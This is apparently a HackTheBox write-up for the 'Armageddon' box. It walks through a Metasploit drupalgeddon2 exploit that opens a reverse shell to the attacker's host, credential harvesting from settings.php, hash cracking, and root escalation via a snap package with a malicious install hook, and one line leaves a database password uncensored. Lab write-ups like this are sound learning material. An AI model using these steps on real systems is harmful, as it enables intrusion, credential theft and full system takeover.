---
layout: post
title: Armageddon - HTB Writeup
date: 2021-07-11 19:05:41.000000000 -05:00
categories: [Hackthebox]
tags: []
author: traysoncombs
permalink: "/armageddon-htb.html"
---

![](/static/img/2021/07/image-17.png)

*Note: I went ahead and added dashes to censor things like passwords and flags.

## Initial Enumeration

Naturally this box was started off with a good ole nmap scan.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/  | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  |_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

Looks like all we got is ssh and a Drupal site. Next thing on the agenda is to use droopescan and see if we can find anything interesting.

```bash
$ droopescan scan drupal -u armageddon.htb
[+] Plugins found:
    profile http://armageddon.htb/modules/profile/
    php http://armageddon.htb/modules/php/
    image http://armageddon.htb/modules/image/
[+] Themes found:
    seven http://armageddon.htb/themes/seven/
    garland http://armageddon.htb/themes/garland/
[+] Possible version(s):
    7.56
[+] Possible interesting urls found:
    Default changelog file - http://armageddon.htb/CHANGELOG.txt
[+] Scan finished (0:02:34.038731 elapsed)
```

Looks like Drupal version 7.56 is running which just so happens to be vulnerable to the so called "drupalgeddon2" vulnerability. Now the name of the box makes perfect sense. Drupalgeddon2 is a vulnerability in Drupal's renderable-arrays. Basically it allowed an attacker to execute PHP code and thus allowed RCE through PHP functions like exec. You can read more about it [here](https://www.outsideonline.com/magazine/technology/drupalgeddon-2-what-why/).

There are many ways to exploit this but I just chose to use Metasploit as it's very convenient and I am very lazy.

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.7:4444
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.233:56450) at 2021-07-11 18:15:40 +0100
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > sessions 1
[*] Starting interaction with 1…
meterpreter >
```

And it looks like we got a shell. Next up we do a little enumeration to see if we can get user access.

## Getting User Access

I did a little enumeration and found Mysql credentials in the settings.php located in the /var/www/html/sites/default/ directory.

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy----------',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

In order to access mysql I had to use meterpreter's shell feature.

```bash
meterpreter > shell
Process 2371 created.
Channel 3 created.
mysql -u drupaluser -pCQHEy------- -e "SHOW TABLES" -D drupal
Tables_in_drupal
actions
authmap
batch
block
block_custom
[cut out for brevity]
users
[cut out for brevity]
```

From here I explored the database a little and found a table called users and within that table a found a password hash for the user "brucetherealadmin" who also happened to be listed in /etc/passwd.

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "SELECT * FROM users" -D drupal
uid    name                            pass
1        brucetherealadmin   $S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------
```

I then ran that hash through hashid to identify what type it is so as to ease the cracking process.

```bash
$ hashid -j
$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------'
[+] Drupal > v7.x [JtR Format: drupal7]
```

Looks like the type is drupal7. Now to input this into JohnTheRipper.

```bash
$ john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bo------          (?)
1g 0:00:00:00 DONE (2021-07-11 19:10) 1.754g/s 407.0p/s 407.0c/s 407.0C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Looks like we got Bruce's password. Now we can use this to SSH into the box.

```bash
$ ssh brucetherealadmin@armageddon.htb
brucetherealadmin@armageddon.htb's password:
Last login: Sun Jul 11 19:25:10 2021 from 10.10.14.7
[brucetherealadmin@armageddon ~]$ cat user.txt
205e6df58-------------------------
```

Success!

## Privilege Escalation

A quick look at what we can run as root reveals a potentially interesting attack vector.

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
[brucetherealadmin@armageddon ~]$
```

After a quick google search I discovered a [GTFOBin](https://gtfobins.github.io/gtfobins/snap/) exists for such a configuration. Similarly to other package managers snap allows packages to include hooks that can be run before and after package installation, basically anything can be run within these hooks and when snap is run with sudo the hooks are executed with sudo permissions. So basically we can create a malicious package that when installed will run a script as root. I am simply going to have it read the root flag as I am lazy, but one could also use it to get a root shell.

We can use [fpm](https://github.com/jordansissel/fpm) on our local machine to create such a package and upload it to the victim using scp.

```bash
$ mkdir -p meta/hooks
$ printf '#!/bin/sh\n%s; false' "cat /root/root.txt" >meta/hooks/install
$ chmod +x meta/hooks/install
$ fpm -n myflagnow -s dir -t snap -a all meta
Created package {:path=>"myflagnow_1.0_all.snap"}
$ scp myflagnow_1.0_all.snap brucetherealadmin@armageddon.htb:~
brucetherealadmin@armageddon.htb's password:
myflagnow_1.0_all.snap                                                                                   100% 4096    28.8KB/s   00:00
```

From here we just need to install the package and the flag should be delivered to us on a silver platter!

```bash
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install myflagnow_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
Run install hook of "myflagnow" snap if present (run hook "install": 31f024b07a8c----------------------)
```

And bam just like that we got the root flag.

## Conclusion

This was probably one of the easier boxes I have done as it was mostly just CVE's and password cracking, but nevertheless it was still a really fun box and taught me about the importance of keeping your software updated.
